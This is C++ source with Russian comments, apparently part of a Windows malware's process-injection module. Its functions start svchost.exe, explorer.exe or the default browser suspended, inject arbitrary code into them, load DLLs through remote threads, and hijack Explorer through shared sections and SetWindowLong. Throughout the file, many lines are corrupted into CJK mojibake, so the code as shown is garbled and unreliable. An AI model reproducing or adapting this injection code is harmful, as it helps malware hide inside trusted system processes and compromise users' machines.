}਀ 
਀⼀⼀ⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀ 
//  Функция возвращает путь к браузеру по умолчанию਀⼀⼀ⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀ 
wstring GetDefaultBrowserPath()਀笀 
	// Создаём HTML файл਀ऀ眀猀琀爀椀渀最 䠀吀䴀䰀䘀椀氀攀 㴀 䜀攀琀匀瀀攀挀椀愀氀䘀漀氀搀攀爀倀愀琀栀圀⠀䌀匀䤀䐀䰀开䄀倀倀䐀䄀吀䄀Ⰰ 䰀∀椀渀搀攀砀⸀栀琀洀氀∀⤀㬀 
	File::WriteBufferW(HTMLFile.t_str(), NULL, 0);਀ 
	// Получаем имя файла਀ऀ眀猀琀爀椀渀最 䘀椀氀攀一愀洀攀⠀䴀䄀堀开倀䄀吀䠀⤀㬀 
	if (pFindExecutableW(HTMLFile.t_str(), NULL, FileName.t_str()))਀ऀऀ䘀椀氀攀一愀洀攀⸀䌀愀氀挀䰀攀渀最琀栀⠀⤀㬀 
	else਀ऀऀ䘀椀氀攀一愀洀攀⸀䌀氀攀愀爀⠀⤀㬀 
਀ऀ⼀⼀ ⌀㐄〄㬄伄㔄㰄 ㈀䀄㔄㰄㔄㴄㴄䬄㤄 䐀〄㤄㬄
	pDeleteFileW(HTMLFile.t_str());਀ 
	return FileName;਀紀 
਀ 
bool CreateDefaultBrowser( PHANDLE hProcess, PHANDLE hThread )਀笀 
	PROCESS_INFORMATION pi;਀ऀ匀吀䄀刀吀唀倀䤀一䘀伀圀 猀椀㬀 
਀ऀ洀开洀攀洀猀攀琀⠀ ☀猀椀Ⰰ 　Ⰰ 猀椀稀攀漀昀⠀ 匀吀䄀刀吀唀倀䤀一䘀伀圀 ⤀ ⤀㬀ऀऀ 
	si.cb	= sizeof( STARTUPINFOW );਀ 
	wstring BrowserPath = GetDefaultBrowserPath();਀ 
	if (BrowserPath.IsEmpty())਀ऀऀ爀攀琀甀爀渀 昀愀氀猀攀㬀 
਀ऀ椀昀⠀瀀䌀爀攀愀琀攀倀爀漀挀攀猀猀圀⠀䈀爀漀眀猀攀爀倀愀琀栀⸀琀开猀琀爀⠀⤀Ⰰ 一唀䰀䰀Ⰰ 　Ⰰ 　Ⰰ 吀刀唀䔀Ⰰ 䌀刀䔀䄀吀䔀开匀唀匀倀䔀一䐀䔀䐀Ⰰ 　Ⰰ 　Ⰰ ☀猀椀Ⰰ ☀瀀椀 ⤀ ⤀ 
	{਀ऀऀ⨀栀倀爀漀挀攀猀猀 㴀 瀀椀⸀栀倀爀漀挀攀猀猀㬀 
		*hThread  = pi.hThread;਀ 
		return true;਀ऀ紀 
਀ऀ爀攀琀甀爀渀 昀愀氀猀攀㬀 
}਀ 
bool JmpToBrowserSelf( DWORD (WINAPI f_Main)(LPVOID) )਀笀 
	HANDLE hProcess = NULL;਀ऀ䠀䄀一䐀䰀䔀 栀吀栀爀攀愀搀ऀ㴀 一唀䰀䰀㬀 
਀ऀ椀昀 ⠀ 䌀爀攀愀琀攀䐀攀昀愀甀氀琀䈀爀漀眀猀攀爀⠀ ☀栀倀爀漀挀攀猀猀Ⰰ ☀栀吀栀爀攀愀搀 ⤀ ⤀ 
	{਀ऀऀ椀昀 ⠀ 䤀渀樀攀挀琀䌀漀搀攀㈀⠀ 栀倀爀漀挀攀猀猀Ⰰ 栀吀栀爀攀愀搀Ⰰ 昀开䴀愀椀渀 ⤀ ⤀ 
		{਀ऀऀऀ爀攀琀甀爀渀 琀爀甀攀㬀 
		}਀ऀऀ攀氀猀攀 
		{਀ऀऀऀ瀀吀攀爀洀椀渀愀琀攀吀栀爀攀愀搀⠀ 栀吀栀爀攀愀搀Ⰰ 　 ⤀㬀 
		}਀ऀ紀 
਀ऀ爀攀琀甀爀渀 昀愀氀猀攀㬀 
}਀ 
਀戀漀漀氀 䨀洀瀀吀漀匀瘀挀栀漀猀琀匀攀氀昀⠀ 䐀圀伀刀䐀 ⠀圀䤀一䄀倀䤀 昀开䴀愀椀渀⤀⠀䰀倀嘀伀䤀䐀⤀ ⤀ 
{਀ऀ䠀䄀一䐀䰀䔀 栀倀爀漀挀攀猀猀 㴀 一唀䰀䰀㬀 
	HANDLE hThread	= NULL;਀ 
	if ( CreateSvchost( &hProcess, &hThread ) )਀ऀ笀 
		if ( InjectCode2( hProcess, hThread, f_Main ) )਀ऀऀऀ爀攀琀甀爀渀 琀爀甀攀㬀 
		else਀ऀऀऀ瀀吀攀爀洀椀渀愀琀攀吀栀爀攀愀搀⠀ 栀吀栀爀攀愀搀Ⰰ 　 ⤀㬀 
	}਀ 
	return false;਀紀 
਀ 
bool TwiceJumpSelf( DWORD (WINAPI f_Main)(LPVOID) )਀笀 
	if ( !JmpToSvchostSelf( f_Main ) )਀ऀ笀 
		if ( !JmpToBrowserSelf( f_Main ) )਀ऀऀ笀 
			return false;਀ऀऀ紀 
	}਀ 
	return true;਀紀 
਀戀漀漀氀 䨀洀瀀吀漀䈀爀漀眀猀攀爀⠀ 䐀圀伀刀䐀 ⠀圀䤀一䄀倀䤀 昀开䴀愀椀渀⤀⠀䰀倀嘀伀䤀䐀⤀ ⤀ 
{਀ऀ䠀䄀一䐀䰀䔀 栀倀爀漀挀攀猀猀 㴀 一唀䰀䰀㬀 
	HANDLE hThread	= NULL;਀ 
	if ( CreateDefaultBrowser( &hProcess, &hThread ) )਀ऀ笀 
		if ( InjectCode3( hProcess, hThread, f_Main ) )਀ऀऀ笀 
			return true;਀ऀऀ紀 
		else਀ऀऀ笀 
			pTerminateThread( hThread, 0 );਀ऀऀ紀 
	}਀ 
	return false;਀紀 
਀戀漀漀氀 䨀洀瀀吀漀匀瘀挀栀漀猀琀⠀ 䐀圀伀刀䐀 ⠀圀䤀一䄀倀䤀 昀开䴀愀椀渀⤀⠀䰀倀嘀伀䤀䐀⤀ ⤀ 
{਀ऀ䠀䄀一䐀䰀䔀 栀倀爀漀挀攀猀猀 㴀 一唀䰀䰀㬀 
	HANDLE hThread	= NULL;਀ 
	bool bRet = false;਀ 
	if ( CreateSvchost( &hProcess, &hThread ) )਀ऀ笀 
		if ( InjectCode3( hProcess, hThread, f_Main ) )਀ऀऀ笀 
			return true;਀ऀऀ紀 
		else਀ऀऀ笀 
			pTerminateThread( hThread, 0 );਀ऀऀ紀 
	}਀ 
	return false;਀紀 
਀ 
bool TwiceJump( DWORD (WINAPI f_Main)(LPVOID) )਀笀 
	if ( !JmpToSvchost( f_Main ) )਀ऀ笀 
		if ( !JmpToBrowser( f_Main ) )਀ऀऀ笀 
			return false;਀ऀऀ紀 
	}਀ 
	return true;਀紀 
਀ 
//---------------------------------------------------਀⼀⼀  䴀攀最愀䨀甀洀瀀 ⴀ ␀䌄㴄㨄䘄㠄伄 䄀㸄㜄㐄〄億䈄 㼀䀄㸄䘄㔄䄄䄄 猀瘀挀栀漀猀琀⸀攀砀攀 㠀
//             осуществляет инжект в него਀⼀⼀ⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀ 
BOOL WINAPI MegaJump(TInjectFunction f_Main)਀笀 
	if ( !TwiceJumpSelf( f_Main ) )਀ऀ笀 
		if ( !TwiceJump( f_Main ) )਀ऀऀ笀 
			return FALSE;਀ऀऀ紀 
	}਀ऀ爀攀琀甀爀渀 吀刀唀䔀㬀 
}਀ 
//---------------------------------------------------਀⼀⼀  䨀洀瀀吀漀䔀砀瀀氀漀爀攀爀 ⴀ ␀䌄㴄㨄䘄㠄伄 㜀〄㼄䌄䄄㨄〄㔄䈄 㨀㸄㼄㠄丄
//                  эксплорера и инжектится в него਀⼀⼀ⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀⴀ 
BOOL WINAPI JmpToExplorer(TInjectFunction f_Main)਀笀 
	HANDLE hProcess = NULL;਀ऀ䠀䄀一䐀䰀䔀 栀吀栀爀攀愀搀ऀ㴀 一唀䰀䰀㬀 
਀ऀ䈀伀伀䰀 刀攀猀甀氀琀 㴀 䘀䄀䰀匀䔀㬀 
	if (CreateExplorer( &hProcess, &hThread))਀ऀ笀 
		Result = InjectCode2(hProcess, hThread, f_Main);਀ऀऀ椀昀 ⠀℀刀攀猀甀氀琀⤀ 
			pTerminateThread( hThread, 0 );਀ऀ紀 
਀ऀ爀攀琀甀爀渀 刀攀猀甀氀琀㬀 
}਀ 
਀戀漀漀氀 䤀渀樀攀挀琀䤀渀琀漀倀爀漀挀攀猀猀⠀ 䐀圀伀刀䐀 瀀椀搀Ⰰ 吀䤀渀樀攀挀琀䘀甀渀挀琀椀漀渀 昀甀渀挀⤀ 
{਀ऀ伀䈀䨀䔀䌀吀开䄀吀吀刀䤀䈀唀吀䔀匀 伀戀樀攀挀琀䄀琀琀爀椀戀甀琀攀猀 㴀 笀 猀椀稀攀漀昀⠀伀戀樀攀挀琀䄀琀琀爀椀戀甀琀攀猀⤀ 紀 㬀 
	CLIENT_ID ClientID;਀ 
	ClientID.UniqueProcess = (HANDLE)pid;਀ऀ䌀氀椀攀渀琀䤀䐀⸀唀渀椀焀甀攀吀栀爀攀愀搀  㴀 　㬀 
਀ऀ䠀䄀一䐀䰀䔀 栀倀爀漀挀攀猀猀㬀 
		਀ऀ椀昀 ⠀ 瀀娀眀伀瀀攀渀倀爀漀挀攀猀猀⠀ ☀栀倀爀漀挀攀猀猀Ⰰ 倀刀伀䌀䔀匀匀开䌀刀䔀䄀吀䔀开吀䠀刀䔀䄀䐀 簀 倀刀伀䌀䔀匀匀开嘀䴀开伀倀䔀刀䄀吀䤀伀一 簀 倀刀伀䌀䔀匀匀开嘀䴀开圀刀䤀吀䔀Ⰰ ☀伀戀樀攀挀琀䄀琀琀爀椀戀甀琀攀猀Ⰰ ☀䌀氀椀攀渀琀䤀䐀 ⤀ ℀㴀 匀吀䄀吀唀匀开匀唀䌀䌀䔀匀匀 ⤀ 
	{਀ऀऀ爀攀琀甀爀渀 昀愀氀猀攀㬀 
	}਀ 
	DWORD dwAddr = InjectCode( hProcess, func );਀ 
	bool ret = false;਀ 
	if ( dwAddr != -1 )਀ऀ笀 
		LPVOID Thread = pCreateRemoteThread( hProcess, 0, 0, (LPTHREAD_START_ROUTINE)dwAddr, NULL, 0, 0 );਀ऀऀ爀攀琀 㴀 吀栀爀攀愀搀 ℀㴀 一唀䰀䰀㬀 
	}਀ 
	pZwClose(hProcess); ਀ऀ 
	return ret;਀紀 
਀戀漀漀氀 䤀渀樀攀挀琀䤀渀琀漀倀爀漀挀攀猀猀㈀⠀ 䐀圀伀刀䐀 瀀椀搀Ⰰ 䐀圀伀刀䐀 ⠀圀䤀一䄀倀䤀 ⨀昀甀渀挀⤀⠀䰀倀嘀伀䤀䐀⤀ ⤀ 
{਀ऀ伀䈀䨀䔀䌀吀开䄀吀吀刀䤀䈀唀吀䔀匀 伀戀樀攀挀琀䄀琀琀爀椀戀甀琀攀猀 㴀 笀 猀椀稀攀漀昀⠀伀戀樀攀挀琀䄀琀琀爀椀戀甀琀攀猀⤀ 紀 㬀 
	CLIENT_ID ClientID;਀ 
	ClientID.UniqueProcess = (HANDLE)pid;਀ऀ䌀氀椀攀渀琀䤀䐀⸀唀渀椀焀甀攀吀栀爀攀愀搀  㴀 　㬀 
਀ऀ䐀圀伀刀䐀 䘀氀愀最猀 㴀 倀刀伀䌀䔀匀匀开䌀刀䔀䄀吀䔀开吀䠀刀䔀䄀䐀 簀 倀刀伀䌀䔀匀匀开嘀䴀开伀倀䔀刀䄀吀䤀伀一 簀 倀刀伀䌀䔀匀匀开嘀䴀开圀刀䤀吀䔀 簀 倀刀伀䌀䔀匀匀开嘀䴀开刀䔀䄀䐀 簀 倀刀伀䌀䔀匀匀开儀唀䔀刀夀开䤀一䘀伀刀䴀䄀吀䤀伀一㬀 
	HANDLE Process = (HANDLE)pOpenProcess(Flags, FALSE, pid);਀⼀⼀    䠀䄀一䐀䰀䔀 栀倀爀漀挀攀猀猀㬀 
//	if ( pZwOpenProcess(&hProcess, Flags, &ObjectAttributes, &ClientID ) != STATUS_SUCCESS )਀⼀⼀ऀऀ爀攀琀甀爀渀 昀愀氀猀攀㬀 
	bool Result = InjectCode4(Process, func);਀ऀ䌀氀漀猀攀䠀愀渀搀氀攀⠀倀爀漀挀攀猀猀⤀㬀 
	return Result;਀紀 
਀ 
//---------------------------------------------------਀⼀⼀  䤀渀樀攀挀䤀渀琀漀倀爀漀挀攀猀猀䈀礀一愀洀攀 
//  Функция запускает процесс с именем AppName и਀⼀⼀  㠀㴄㘄㔄㨄䈄㠄䈄䄄伄 ㈀ 㴀㔄㌄㸄
//---------------------------------------------------਀䈀伀伀䰀 圀䤀一䄀倀䤀 䤀渀樀攀挀䤀渀琀漀倀爀漀挀攀猀猀䈀礀一愀洀攀䄀⠀挀漀渀猀琀 挀栀愀爀⨀ 䄀瀀瀀一愀洀攀Ⰰ 挀漀渀猀琀 挀栀愀爀⨀ 䌀洀搀䰀椀渀攀Ⰰ 吀䤀渀樀攀挀琀䘀甀渀挀琀椀漀渀 䘀甀渀挀琀椀漀渀⤀ 
{਀ऀ椀昀 ⠀匀吀刀䄀㨀㨀䤀猀䔀洀瀀琀礀⠀䄀瀀瀀一愀洀攀⤀ 簀簀 ℀䘀甀渀挀琀椀漀渀⤀ 
		return FALSE;਀ 
	PROCESS_INFORMATION pi;਀ऀ匀吀䄀刀吀唀倀䤀一䘀伀䄀 猀椀㬀 
	ClearStruct(si);਀ऀ猀椀⸀挀戀 㴀 猀椀稀攀漀昀⠀猀椀⤀㬀 
਀ऀ 
	if(!pCreateProcessA(AppName, CmdLine, 0, 0, TRUE, CREATE_SUSPENDED, 0, 0, &si, &pi ))਀ऀऀ爀攀琀甀爀渀 䘀䄀䰀匀䔀㬀 
	return InjectCode2(pi.hProcess, pi.hThread, Function);਀紀 
਀ 
//---------------------------------------------------਀⼀⼀  䤀渀樀攀挀琀䤀渀琀漀䔀砀瀀氀漀爀攀爀 ⴀ ␀䌄㴄㨄䘄㠄伄 㠀㴄㘄㔄㨄䈄㠄䈄 㸀㄄䀄〄㜄
//                       в запущенный экземпляр਀⼀⼀                       䴀㨄䄄㼄㬄㸄䀄㔄䀄〄
//---------------------------------------------------਀䈀伀伀䰀 圀䤀一䄀倀䤀 䤀渀樀攀挀琀䤀渀琀漀䔀砀瀀氀漀爀攀爀⠀吀䤀渀樀攀挀琀䘀甀渀挀琀椀漀渀 昀开䴀愀椀渀⤀ 
{਀ऀ椀昀⠀ ℀一攀眀䤀渀樀攀挀琀㨀㨀䤀渀樀攀挀琀䔀砀瀀氀漀爀攀㌀㈀⠀昀开䴀愀椀渀⤀ ⤀ 
	{਀ऀऀ䐀圀伀刀䐀 倀椀搀 㴀 䜀攀琀䔀砀瀀氀漀爀攀爀倀椀搀⠀⤀㬀 
		if (!Pid) return FALSE;਀ऀऀ爀攀琀甀爀渀 䤀渀樀攀挀琀䤀渀琀漀倀爀漀挀攀猀猀⠀倀椀搀Ⰰ 昀开䴀愀椀渀 ⤀㬀 
	}਀ऀ爀攀琀甀爀渀 吀刀唀䔀㬀 
}਀ 
਀戀漀漀氀 䤀渀樀攀挀琀䐀氀氀⠀ 圀䌀䠀䄀刀 ⨀䐀氀氀倀愀琀栀 ⤀ 
{਀ऀ椀昀 ⠀ 瀀䜀攀琀䘀椀氀攀䄀琀琀爀椀戀甀琀攀猀圀⠀ 䐀氀氀倀愀琀栀 ⤀ ⤀ 
	{਀ऀऀ䠀䄀一䐀䰀䔀 栀倀爀漀挀攀猀猀㬀 
		HANDLE hThread;਀ 
		if ( !CreateSvchost( &hProcess, &hThread ) )਀ऀऀ笀 
			if ( !CreateDefaultBrowser( &hProcess, &hThread ) )਀ऀऀऀ笀 
				return false;਀ऀऀऀ紀 
		}਀ऀऀ 
		DWORD dwWritten;਀ 
		LPVOID lpStringLoc = pVirtualAllocEx( hProcess, 0, m_wcslen( DllPath ) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );਀ऀऀ 
		if ( !(BOOL)pWriteProcessMemory( hProcess, lpStringLoc, DllPath, m_wcslen( DllPath ) + 1, &dwWritten ) )਀ऀऀ笀 
			return false;਀ऀऀ紀 
਀ऀऀ瀀䌀爀攀愀琀攀刀攀洀漀琀攀吀栀爀攀愀搀⠀ 栀倀爀漀挀攀猀猀Ⰰ 　Ⰰ 　Ⰰ ⠀䰀倀吀䠀刀䔀䄀䐀开匀吀䄀刀吀开刀伀唀吀䤀一䔀⤀䜀攀琀倀爀漀挀䄀搀搀爀攀猀猀䔀砀⠀ 一唀䰀䰀Ⰰ ㄀Ⰰ 　砀䌀㠀䄀䌀㠀　㌀　 ⤀Ⰰ 氀瀀匀琀爀椀渀最䰀漀挀Ⰰ 　Ⰰ 　 ⤀㬀 
	}਀ऀऀ 
	਀ऀ爀攀琀甀爀渀 琀爀甀攀㬀 
}਀ 
namespace NewInject਀笀 
਀⌀搀攀昀椀渀攀 䤀渀椀琀椀愀氀椀稀攀伀戀樀攀挀琀䄀琀琀爀椀戀甀琀攀猀⠀ 瀀Ⰰ 渀Ⰰ 愀Ⰰ 爀Ⰰ 猀 ⤀ 笀   尀 
    (p)->Length = sizeof( OBJECT_ATTRIBUTES );          \਀    ⠀瀀⤀ⴀ㸀刀漀漀琀䐀椀爀攀挀琀漀爀礀 㴀 爀㬀                             尀 
    (p)->Attributes = a;                                \਀    ⠀瀀⤀ⴀ㸀伀戀樀攀挀琀一愀洀攀 㴀 渀㬀                                尀 
    (p)->SecurityDescriptor = s;                        \਀    ⠀瀀⤀ⴀ㸀匀攀挀甀爀椀琀礀儀甀愀氀椀琀礀伀昀匀攀爀瘀椀挀攀 㴀 一唀䰀䰀㬀               尀 
    }਀ 
#define RtlOffsetToPointer(B,O) ((PCHAR)(((PCHAR)(B)) + ((ULONG_PTR)(O))))਀ 
struct PARAM_DATA਀笀 
	PVOID func;਀ऀ倀嘀伀䤀䐀 椀洀愀最攀䈀愀猀攀㬀 
};਀ 
struct CODE_DATA਀笀 
	BOOL (WINAPI *_CloseHandle)(HANDLE hObject);਀ऀ䰀倀嘀伀䤀䐀 ⠀圀䤀一䄀倀䤀 ⨀开䴀愀瀀嘀椀攀眀伀昀䘀椀氀攀⤀⠀䠀䄀一䐀䰀䔀 栀䘀椀氀攀䴀愀瀀瀀椀渀最伀戀樀攀挀琀Ⰰ 䐀圀伀刀䐀 搀眀䐀攀猀椀爀攀搀䄀挀挀攀猀猀Ⰰ 䐀圀伀刀䐀 搀眀䘀椀氀攀伀昀昀猀攀琀䠀椀最栀Ⰰ 䐀圀伀刀䐀 搀眀䘀椀氀攀伀昀昀猀攀琀䰀漀眀Ⰰ 匀䤀娀䔀开吀 搀眀一甀洀戀攀爀伀昀䈀礀琀攀猀吀漀䴀愀瀀⤀㬀 
	HANDLE (WINAPI *_OpenFileMappingA)(DWORD dwDesiredAccess, BOOL bInheritHandle, char* lpName);਀ऀ䠀䄀一䐀䰀䔀 ⠀圀䤀一䄀倀䤀 ⨀开䌀爀攀愀琀攀吀栀爀攀愀搀⤀⠀䰀倀匀䔀䌀唀刀䤀吀夀开䄀吀吀刀䤀䈀唀吀䔀匀 氀瀀吀栀爀攀愀搀䄀琀琀爀椀戀甀琀攀猀Ⰰ 匀䤀娀䔀开吀 搀眀匀琀愀挀欀匀椀稀攀Ⰰ 倀嘀伀䤀䐀 氀瀀匀琀愀爀琀䄀搀搀爀攀猀猀Ⰰ 䰀倀嘀伀䤀䐀 氀瀀倀愀爀愀洀攀琀攀爀Ⰰ 䐀圀伀刀䐀 搀眀䌀爀攀愀琀椀漀渀䘀氀愀最猀Ⰰ 䰀倀䐀圀伀刀䐀 氀瀀吀栀爀攀愀搀䤀搀⤀㬀 
	LONG (WINAPI *_SetWindowLongA)(HWND hWnd, int nIndex, LONG dwNewLong);਀ऀ瘀漀椀搀 ⠀圀䤀一䄀倀䤀 ⨀开伀甀琀瀀甀琀䐀攀戀甀最匀琀爀椀渀最䄀⤀⠀ 挀栀愀爀⨀ 氀瀀伀甀琀瀀甀琀匀琀爀椀渀最 ⤀㬀 
਀ऀ䈀伀伀䰀䔀䄀一 椀渀樀攀挀琀䘀氀愀最㬀 
	HWND wnd;਀ऀ䰀伀一䜀 漀氀搀䰀漀渀最㬀 
	PVOID injectNormalRoutine;਀ऀ倀䄀刀䄀䴀开䐀䄀吀䄀 瀀愀爀愀洀㬀 
	char sectionName[32];਀ऀ挀栀愀爀 琀攀洀瀀嬀㌀崀㬀 
};਀ 
struct INJECT32_DATA਀笀 
	DWORD ropCode[32];਀ऀ䐀圀伀刀䐀 渀攀眀䰀漀渀最嘀吀愀戀氀攀嬀㠀崀㬀 
	CODE_DATA codeData;਀ऀ䌀䠀䄀刀 椀渀樀攀挀琀䌀漀搀攀嬀　砀㄀　　崀㬀 
};਀ 
static VOID __declspec(naked) Inject32Start( CODE_DATA* data )਀笀 
	__asm mov ebp, esp਀ 
	if (!data->injectFlag)਀ऀ笀 
		data->injectFlag = TRUE;਀ 
		HANDLE map;਀ऀऀ椀昀⠀ 洀愀瀀 㴀 搀愀琀愀ⴀ㸀开伀瀀攀渀䘀椀氀攀䴀愀瀀瀀椀渀最䄀⠀ 䘀䤀䰀䔀开䴀䄀倀开䄀䰀䰀开䄀䌀䌀䔀匀匀 簀 䘀䤀䰀䔀开䴀䄀倀开䔀堀䔀䌀唀吀䔀Ⰰ 䘀䄀䰀匀䔀Ⰰ 搀愀琀愀ⴀ㸀猀攀挀琀椀漀渀一愀洀攀 ⤀⤀ 
		{਀ऀऀऀ倀嘀伀䤀䐀 洀愀瀀瀀椀渀最㬀 
			if( mapping = data->_MapViewOfFile( map, FILE_MAP_ALL_ACCESS | FILE_MAP_EXECUTE, 0, 0, 0 ) )਀ऀऀऀ笀 
				data->param.imageBase = mapping;਀ऀऀऀऀ搀愀琀愀ⴀ㸀开䌀爀攀愀琀攀吀栀爀攀愀搀⠀ 一唀䰀䰀Ⰰ 　Ⰰ 刀琀氀伀昀昀猀攀琀吀漀倀漀椀渀琀攀爀⠀ 洀愀瀀瀀椀渀最Ⰰ 搀愀琀愀ⴀ㸀椀渀樀攀挀琀一漀爀洀愀氀刀漀甀琀椀渀攀 ⤀Ⰰ ☀搀愀琀愀ⴀ㸀瀀愀爀愀洀Ⰰ 　Ⰰ 一唀䰀䰀 ⤀㬀 
			}਀ऀऀऀ搀愀琀愀ⴀ㸀开䌀氀漀猀攀䠀愀渀搀氀攀⠀洀愀瀀⤀㬀 
		}਀ऀ紀 
਀ऀ搀愀琀愀ⴀ㸀开匀攀琀圀椀渀搀漀眀䰀漀渀最䄀⠀ 搀愀琀愀ⴀ㸀眀渀搀Ⰰ 　Ⰰ 搀愀琀愀ⴀ㸀漀氀搀䰀漀渀最 ⤀㬀 
਀ऀ开开愀猀洀 
	{਀ऀऀ砀漀爀 攀愀砀Ⰰ 攀愀砀 
		add esp, 0x54਀ऀऀ瀀漀瀀 攀戀瀀 
		ret 0x10਀ऀ紀 
਀紀 
਀猀琀愀琀椀挀 嘀伀䤀䐀 开开搀攀挀氀猀瀀攀挀⠀渀愀欀攀搀⤀ 䤀渀樀攀挀琀㌀㈀䔀渀搀⠀⤀ 
{਀紀 
਀⼀⼀⌀瀀爀愀最洀愀 漀瀀琀椀洀椀稀攀⠀∀∀Ⰰ 漀渀⤀ 
਀倀嘀伀䤀䐀 䜀攀琀䬀椀唀猀攀爀䄀瀀挀䐀椀猀瀀愀琀挀栀攀爀倀爀漀挀⠀⤀ 
{਀ऀ䈀夀吀䔀⨀ 瀀爀漀挀䄀搀搀爀攀猀猀 㴀 ⠀䈀夀吀䔀⨀⤀瀀䜀攀琀倀爀漀挀䄀搀搀爀攀猀猀⠀ 瀀䜀攀琀䴀漀搀甀氀攀䠀愀渀搀氀攀䄀⠀∀渀琀搀氀氀⸀搀氀氀∀⤀Ⰰ ∀䬀椀唀猀攀爀䄀瀀挀䐀椀猀瀀愀琀挀栀攀爀∀ ⤀㬀 
	BYTE* address = procAddress;਀ऀ䐀圀伀刀䐀 椀 㴀 　㬀 
਀ऀ眀栀椀氀攀⠀ ⨀⠀䈀夀吀䔀⨀⤀愀搀搀爀攀猀猀 ℀㴀 　砀㔀㠀 ☀☀ ⨀⠀圀伀刀䐀⨀⤀愀搀搀爀攀猀猀 ℀㴀 　砀㜀䌀㠀䐀 ☀☀ ⨀⠀䈀夀吀䔀⨀⤀⠀⠀䐀圀伀刀䐀⤀愀搀搀爀攀猀猀 ⬀ ㈀⤀ ℀㴀 　砀㈀㐀⤀ 
	{਀ऀऀ䐀圀伀刀䐀 氀攀渀㬀 
		i++;਀ऀऀ䜀攀琀䤀渀猀琀䰀攀渀最栀琀⠀ ⠀䐀圀伀刀䐀⨀⤀愀搀搀爀攀猀猀Ⰰ ☀氀攀渀 ⤀㬀 
		address += len;਀ऀऀ椀昀⠀ 椀 㸀㴀 　砀㄀㐀 ⤀ 爀攀琀甀爀渀 瀀爀漀挀䄀搀搀爀攀猀猀㬀 
	}਀ 
	return address;਀紀 
਀䐀圀伀刀䐀 䌀漀洀瀀愀爀攀䴀攀洀漀爀礀䄀渀搀刀攀愀搀⠀ 䠀䄀一䐀䰀䔀 瀀爀漀挀攀猀猀Ⰰ 倀嘀伀䤀䐀 爀攀洀漀琀攀䄀搀搀爀攀猀猀Ⰰ 匀䤀娀䔀开吀 爀攀洀漀琀攀匀椀稀攀Ⰰ 倀嘀伀䤀䐀 洀攀洀漀爀礀Ⰰ 匀䤀娀䔀开吀 猀椀稀攀⤀ 
{਀ऀ䈀夀吀䔀⨀ 氀漀挀愀氀㬀 
	DWORD rva = 0;਀ऀ匀䤀娀䔀开吀 琀㬀 
਀ऀ椀昀⠀ 氀漀挀愀氀 㴀 ⠀䈀夀吀䔀⨀⤀瀀嘀椀爀琀甀愀氀䄀氀氀漀挀⠀ 一唀䰀䰀Ⰰ 爀攀洀漀琀攀匀椀稀攀Ⰰ 䴀䔀䴀开䌀伀䴀䴀䤀吀 簀 䴀䔀䴀开刀䔀匀䔀刀嘀䔀Ⰰ 倀䄀䜀䔀开刀䔀䄀䐀圀刀䤀吀䔀 ⤀ ⤀ 
	{਀ऀऀ椀昀⠀ 瀀刀攀愀搀倀爀漀挀攀猀猀䴀攀洀漀爀礀⠀ 瀀爀漀挀攀猀猀Ⰰ 爀攀洀漀琀攀䄀搀搀爀攀猀猀Ⰰ 氀漀挀愀氀Ⰰ 爀攀洀漀琀攀匀椀稀攀Ⰰ ☀琀 ⤀ ⤀ 
		{਀ऀऀऀ䈀夀吀䔀⨀ 愀搀搀爀 㴀 ⠀䈀夀吀䔀⨀⤀洀开洀攀洀洀攀洀⠀ 氀漀挀愀氀Ⰰ 爀攀洀漀琀攀匀椀稀攀Ⰰ 洀攀洀漀爀礀Ⰰ 猀椀稀攀 ⤀㬀 
			if( addr )਀ऀऀऀऀ爀瘀愀 㴀 愀搀搀爀 ⴀ 氀漀挀愀氀㬀 
		}਀ऀऀ瀀嘀椀爀琀甀愀氀䘀爀攀攀⠀ 氀漀挀愀氀Ⰰ 　Ⰰ 䴀䔀䴀开刀䔀䰀䔀䄀匀䔀 ⤀㬀 
	}਀ऀ爀攀琀甀爀渀 爀瘀愀㬀 
}਀ 
PVOID FindCodeInProcessCode( HANDLE process, PVOID memory, SIZE_T size)਀笀 
	PVOID ret = NULL;਀ऀ䠀䴀伀䐀唀䰀䔀 ⨀洀漀搀猀 㴀 ⠀䠀䴀伀䐀唀䰀䔀⨀⤀䠀䔀䄀倀㨀㨀䄀氀氀漀挀⠀　砀㐀㄀　⤀㬀 
	DWORD needed;਀ 
	if( mods )਀ऀ笀 
		if( pEnumProcessModules( process, mods, 0x410, &needed ) )਀ऀऀ笀 
			PVOID buffer = HEAP::Alloc(0x400);਀ 
			if( buffer )਀ऀऀऀ笀 
				for( DWORD i = 0; i < (needed / sizeof(HMODULE)); i++ )਀ऀऀऀऀ笀 
					SIZE_T t;਀ 
					if( pReadProcessMemory( process, mods[i], buffer, 0x400, &t ) )਀ऀऀऀऀऀ笀 
						PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)pRtlImageNtHeader(buffer);਀ऀऀऀऀऀऀ椀昀⠀ 渀琀䠀攀愀搀攀爀猀 ⤀ 
						{਀ऀऀऀऀऀऀऀ倀䤀䴀䄀䜀䔀开匀䔀䌀吀䤀伀一开䠀䔀䄀䐀䔀刀 猀攀挀琀椀漀渀 㴀 䤀䴀䄀䜀䔀开䘀䤀刀匀吀开匀䔀䌀吀䤀伀一⠀渀琀䠀攀愀搀攀爀猀⤀㬀 
